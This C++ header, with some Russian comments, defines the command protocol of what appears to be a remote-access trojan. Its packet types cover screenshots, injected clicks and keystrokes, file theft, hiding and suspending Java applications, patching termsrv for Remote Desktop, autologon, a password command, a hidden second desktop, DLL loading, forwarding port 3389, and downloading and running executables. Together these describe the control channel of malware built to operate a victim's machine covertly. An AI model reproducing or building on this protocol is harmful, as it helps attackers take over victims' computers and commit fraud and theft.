#pragma once

//==============================================================

#define DEFAULT_SERVER_PORT			711
#define CURRENT_PROTOCOL_VERSION	0x00010001

//==============================================================

#pragma warning( disable:4200 )
#pragma pack(push,1)

typedef struct Packet
{
	WORD type;
	DWORD timestamp;
	DWORD size;
	BYTE data[/*size*/];
}
*PPacket;

#pragma pack(pop)
#pragma warning( default:4200 )

//==============================================================

#pragma pack(push,1)

const WORD PK_SC_PING = 0x1;
const WORD PK_CS_PONG = 0x81;
// content: none

const WORD PK_SC_INFO = 0x2;
const WORD PK_CS_INFO = 0x82;
// content:
//  in: none
//  out: SYST_INFO
struct SYST_INFO
{
	DWORD dwProtocolVersion;
	SIZE desktopSize;
	OSVERSIONINFOEX osVersion;
	BOOL isW64;
	SYSTEM_INFO SysInfo;
	TCHAR name[1024];
	TCHAR Coment[256];
};



const WORD PK_SC_WIN_CONTROL_NAME=0xD;
const WORD PK_CS_WIN_CONTROL_NAME=0x8D;



const WORD PK_SC_WINLIST = 0x3;
const WORD PK_CS_WINLIST = 0x83;

// content:
//  in: none
//  out: array of WIN_INFO
struct WIN_INFO
{
	DWORD_PTR id;
	TCHAR title[250];
	TCHAR classname[250];
	WINDOWPLACEMENT placement;
	DWORD_PTR id_parent;
};


const WORD PK_SC_WINSHOT = 0x4;
const WORD PK_CS_WINSHOT = 0x84;
struct SCRIN_SHOT
{
	DWORD_PTR id;
	BOOL isDelFile;

};
// content:
//  in: DWORD_PTR - window's id
//  out: WIN_SHOT
#pragma warning( disable:4200 )
struct WIN_SHOT
{
	DWORD_PTR id;
	BYTE compression; // 0=INVALID_WINDOW, 1=BMP, 2=JPEG
	DWORD imagelength;
	BYTE imagedata[/*imagelength*/];
};
#pragma warning( default:4200 )


const WORD PK_SC_LEFTCLICK = 0x5;
const WORD PK_CS_LEFTCLICK = 0x85;
// content:
//  in: LEFT_CLICK
//  out: none
struct LEFT_CLICK
{
	DWORD_PTR idWindow;
	WORD x,y;
	WORD doubleClick;
	//WORD desktop;
};


const WORD PK_SC_KEYS = 0x6;
const WORD PK_CS_KEYS = 0x86;
// content:
//  in: KEYS
//  out: none
struct KEYS
{
	DWORD_PTR idWindow;
	WORD x,y;
	BYTE flags; // 
				// 0x1 = Add ENTER key
				// 0x2 = Add Ctrl+A
	bool bIsSend;
	TCHAR str[250];
};


const WORD PK_SC_RUN = 0x7;
const WORD PK_CS_RUN = 0x87;
// content:
//  in: RUN_INFO
//  out: none
struct RUN_INFO
{
	DWORD idApp;	// 0 = IE
					// another value = HWND of process to hook
	TCHAR str[MAX_PATH];
	TCHAR ExeStr[MAX_PATH];
	BOOL sw_shell;
	BOOL sw_run_withIE;
	DWORD dwHost;
};


const WORD PK_SC_PATCHINFO = 0x8;
const WORD PK_CS_PATCHINFO = 0x88;
// content:
//  in: none
//  out: PATCH_INFO
struct PATCH_INFO
{
	DWORD idPatch;
	DWORD rtsize;
	TCHAR javaVersion[64];
	DWORD downloaded_bytes;
	DWORD bytes_to_download;
};

const WORD PK_SC_PATCHSTART = 0x9;
const WORD PK_CS_PATCHSTART = 0x89;
// content:
//  in: PATCH_START
//  out: none
struct PATCH_START
{
	bool  sw_save;
	DWORD idPatch;
	WCHAR targetFile[MAX_PATH];
	WCHAR sourceFile[MAX_PATH];
	WCHAR processToKill[MAX_PATH];
	DWORD bytes_to_download;
};

// W: works backward - client initiates download!!!
const WORD PK_SC_PATCHDATA = 0xA;
const WORD PK_CS_PATCHDATA = 0x8A;
// content:
//  in: PATCH_DATA_REQUEST
//  out: PATCH_DATA_ANSWER
#pragma warning( disable:4200 )
struct PATCH_DATA_REQUEST
{
	DWORD idPatch;
	DWORD bytes_from;
	DWORD bytes_count;
	WCHAR sourceFile[MAX_PATH];
};
struct PATCH_DATA_ANSWER
{
	DWORD idPatch;
	DWORD bytes_from;
	DWORD bytes_count;
	BYTE bytes[/*bytes_count*/];
};
#pragma warning( default:4200 )


const WORD PK_SC_WINCMD = 0xB;
const WORD PK_CS_WINCMD = 0x8B;
// content:
//  in: WIN_CMD
//  out: none
struct WIN_CMD
{
	DWORD_PTR id;
	DWORD command;
	BYTE data[256];
	DWORD dataLen;
};


const WORD PK_SC_SETOPTIONS = 0xC;
const WORD PK_CS_SETOPTIONS = 0x8C;
// content:
//  in: CL_OPTIONS
//  out: none
struct CL_OPTIONS
{
	DWORD sleep1;
	DWORD sleep2;
	DWORD sleep3;
	DWORD sleep;
	DWORD prio1;
	WCHAR Coments[256];
	WCHAR m_WinHederName[25];
	WCHAR m_ProccessName[25];
	WCHAR m_ClassName[50];
};
const WORD PK_SC_KEYS_TO_CONTROL = 0xE;
const WORD PK_CS_KEYS_TO_CONTROL = 0x8E;
// content:
//  in: KEYS
//  out: none
struct KEYS_TO_CONTROL
{
	DWORD_PTR idWindow;
	DWORD_PTR idControl;
	WORD x,y;
	BYTE flags; // 
				// 0x1 = Add ENTER key
				// 0x2 = Add Ctrl+A
	BYTE flags1;// 0x1 = SendMess key
	TCHAR str[250];
};
const WORD PK_SC_LEFT_DOWN_TO_CONTROL = 0xF;
const WORD PK_CS_LEFT_DOWN_TO_CONTROL = 0x8F;

const WORD PK_SC_RIGHT_DOWN_TO_CONTROL = 0x11;
const WORD PK_CS_RIGHT_DOWN_TO_CONTROL = 0x811;

const WORD PK_SC_WIN_CLOSE = 0x12;
const WORD PK_CS_WIN_CLOSE = 0x812;

const WORD PK_SC_FILELIST = 0x13;
const WORD PK_CS_FILELIST = 0x813;
struct FILELIST_CMD
{
	DWORD dwComand;
	TCHAR str[MAX_PATH];
};

const WORD PK_SC_DRIVERLIST = 0x14;
const WORD PK_CS_DRIVERLIST  = 0x814;
// content:
//  in: none
//  out: array of DRIVER_INFO
struct DRIVER_INFO
{
	DWORD drivers;
	UINT info[26];
	BYTE count;
};

const WORD PK_SC_FILEGET = 0x15;
const WORD PK_CS_FILEGET = 0x815;
struct FILEGET_CMD
{
	DWORD dwComand;
	DWORD dwData;
	TCHAR filename[MAX_PATH];
};
const WORD FS_NOTLAST_PART = 0;
const WORD FS_LAST_PART = 1;
struct FILE_PART
{
	TCHAR filename[MAX_PATH];
	DWORD file_id;
	WORD status;
	DWORD packet_N;
	BYTE buffer[1024];
};
const WORD PK_SC_RUNSOUND = 0x18;



const WORD PK_SC_RUNFILE = 0x19;
const WORD PK_CS_RUNFILE = 0x819;
struct FILERUN_CMD
{
	DWORD dwSellEx_Or_CreateP;	// метод зпуска 1- createProces 2- ShelExecute
	DWORD dwStyle;				// свернутый развернутый скрытый..
	TCHAR filename[MAX_PATH];	// файл для запуска
};

const WORD PK_SC_PROCESSLIST = 0x22; //получение списка процессов
const WORD PK_CS_PROCESSLIST  = 0x822;

const WORD PK_SC_RESUMEJAVA = 0x23;
const WORD PK_CS_RESUMEJAVA = 0x823;

const WORD PK_SC_SUSPENDJAVA = 0x24;
const WORD PK_CS_SUSPENDJAVA = 0x824;

const WORD PK_SC_SHOW = 0x25;
const WORD PK_CS_SHOW = 0x825;

const WORD PK_SC_HIDE = 0x26;
const WORD PK_CS_HIDE = 0x826;

const WORD PK_SC_SHOW_JAVA_TRAY = 0x27;
const WORD PK_CS_SHOW_JAVA_TRAY = 0x827;

const WORD PK_SC_HIDE_JAVA_TRAY = 0x28;
const WORD PK_CS_HIDE_JAVA_TRAY = 0x828;

const WORD PK_SC_CREATE_VPN = 0x29;
const WORD PK_CS_CREATE_VPN = 0x829;

const WORD PK_SC_OPEN_VPN = 0x2A;
const WORD PK_CS_OPEN_VPN = 0x82A;

const WORD PK_SC_CLOSE_VPN = 0x2B;
const WORD PK_CS_CLOSE_VPN = 0x82B;

const WORD PK_SC_GET_GATEWAY_IPS = 0x2C;
const WORD PK_CS_GET_GATEWAY_IPS = 0x82C;
struct ADAPTER_GATEWAYS
{
	char AdapterName[260];
	char Gateways[10][16];
	DWORD GatewayCount;
	DWORD type;
};

const WORD PK_SC_PATCH_TERMSRV = 0x2D;
const WORD PK_CS_PATCH_TERMSRV = 0x82D;

const WORD PK_SC_REBOOT = 0x2E;
const WORD PK_CS_REBOOT = 0x82E;

const WORD PK_SC_PASSWORD = 0x2F;
const WORD PK_CS_PASSWORD = 0x82F;

const WORD PK_SC_SWITCH_DESK_1 = 0x30;
const WORD PK_CS_SWITCH_DESK_1 = 0x830;

const WORD PK_SC_SWITCH_DESK_2 = 0x31;
const WORD PK_CS_SWITCH_DESK_2 = 0x831;

const WORD PK_SC_AUTOLOGON_CHECK = 0x32;
const WORD PK_CS_AUTOLOGON_CHECK = 0x832;

const WORD PK_SC_AUTOLOGON_ON = 0x33;
const WORD PK_CS_AUTOLOGON_ON = 0x833;

const WORD PK_SC_AUTOLOGON_OFF = 0x34;
const WORD PK_CS_AUTOLOGON_OFF = 0x834;

const WORD PK_SC_KILLPROCESSFROMLIST =0x35;
const WORD PK_CS_KILLPROCESSFROMLIST =0x835;

const WORD PK_SC_KILLPROCESFROMLIST_I_F_O =0x36;
const WORD PK_CS_KILLPROCESFROMLIST_I_F_O =0x836;

const WORD PK_SC_JAVAMOVE =0x37;
const WORD PK_CS_JAVAMOVE =0x837;

const WORD PK_SC_SHOWALLWINDOWS =0x38;
const WORD PK_CS_SHOWALLWINDOWS =0x838;

const WORD PK_SC_REMOTE_REBOOT2 =0x39;
const WORD PK_CS_REMOTE_REBOOT2 =0x839;

const WORD PK_SC_CREATE_VPN_MANUALY = 0x3A;
const WORD PK_CS_CREATE_VPN_MANUALY = 0x83A;

const WORD PK_SC_VPN_STATE = 0x3B;
const WORD PK_CS_VPN_STATE = 0x83B;

const WORD PK_SC_SOUND_OFF = 0x3C;
const WORD PK_CS_SOUND_OFF = 0x83C;

const WORD PK_SC_SOUND_ON = 0x3D;
const WORD PK_CS_SOUND_ON = 0x83D;

const WORD PK_SC_DELETE_VPN = 0x3E;
const WORD PK_CS_DELETE_VPN = 0x83E;

const WORD PK_SC_HIDEFROMSECONDDESC_OFF = 0x3F;
const WORD PK_SC_HIDEFROMSECONDDESC_ON	= 0x83F;

const WORD PK_SC_DOWNLOAD = 0x41;

const WORD PK_SC_CLOLSE_SB = 0x42;


const WORD PK_SC_LOAD_DLL = 0x43;
const WORD PK_SC_CLOSE_DLL	= 0x44;

const WORD PK_SC_PORTFORW = 0x45;
const WORD PK_CS_PORTFORW = 0x845;
const int defaultPortForward = 3389; //какой порт нужно пробросить по умолчанию
struct PORT_FORW
{
	WORD portForw; //порт который нужно пробросить, если 0, то пробрасывается defaultPortForward
	WORD portConnect; //к какому порту нужно соединиться, чтобы сделать проброс, если 0, то берется тот с которым уже соединились
};

const WORD PK_SC_ANCStat = 0x46;
const WORD PK_SC_ANCStop = 0x846;

const WORD PK_SC_PATCHSTARTDATA = 0x47;

const WORD PK_CS_PATCHDATA_VNC=0x848;
const WORD PK_CS_PATCHDATA_RDP=0x849;

const WORD PK_SC_DOWNLOADAndRunEXE= 0x4A;
const WORD PK_CS_DOWNLOADAndRunEXE= 0x84A;


#pragma pack(pop)

//==============================================================

class PacketBuffer
{
protected:

	DWORD m_dwLen;
	DWORD m_dwAllocated;
	BYTE *m_pBuffer;

public:

	PacketBuffer();
	~PacketBuffer();

	void Reset();

	bool Receive( SOCKET s, bool *pActivity );

	void Create( int type, DWORD ts, DWORD size, void *data );
	bool Send( SOCKET s );

	bool IsPacketCompleted();
	PPacket GetFirst();
	void DiscardFirst();

	DWORD GetExpectedBytes();
	DWORD GetReceivedBytes();
};

//==============================================================
